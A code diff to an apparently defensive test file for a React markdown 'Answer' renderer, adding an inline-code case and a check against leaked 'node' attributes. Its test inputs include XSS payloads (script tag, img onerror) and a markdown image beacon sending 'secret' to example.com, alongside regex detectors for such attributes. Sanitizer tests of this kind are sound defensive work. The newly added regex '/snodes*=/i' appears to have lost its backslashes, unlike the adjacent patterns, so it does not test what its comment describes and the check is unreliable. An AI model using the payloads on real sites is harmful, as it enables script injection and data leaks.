@@ -19,6 +19,7 @@ import { createElement } from "react";
 import { Answer } from "./Answer";
 
 const CASES = [
+  "0. Inline code: `first_buffer` and **bold** text",
   "1. Script tag: <script>alert('xss')</script>",
   '2. Image handler: <img src=x onerror="alert(1)">',
   "3. Markdown image beacon: ![leak](https://example.com/beacon.png?d=secret)",
@@ -49,6 +50,10 @@ const checks: [string, boolean][] = [
   ["no href attribute", !/\shref\s*=/i.test(inTags)],
   ["no src attribute", !/\ssrc\s*=/i.test(inTags)],
   ["no on* handler attribute", !/\son[a-z]+\s*=/i.test(inTags)],
+  // react-markdown hands every component its internal mdast `node`; spreading the
+  // rest props straight onto a DOM element emits node="[object Object]", once per
+  // inline code span - 299 times in a real answer.
+  ["no framework internals leak as attributes", !/snodes*=/i.test(inTags)],
   ["no URL in any attribute", !/(https?:|javascript:)/i.test(inTags)],
   ["link text survives as words", /click me/.test(html)],
   ["entity-smuggled tag stays escaped", /&lt;img src=x/.test(html)],
